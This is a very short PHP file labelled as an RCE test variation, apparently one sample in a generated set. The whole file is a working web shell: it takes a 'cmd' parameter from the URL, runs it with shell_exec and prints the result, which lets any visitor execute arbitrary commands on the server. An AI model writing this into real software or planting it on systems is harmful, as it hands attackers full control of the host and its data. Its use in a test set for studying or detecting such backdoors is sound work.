<?php
// RCE test variation #220
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>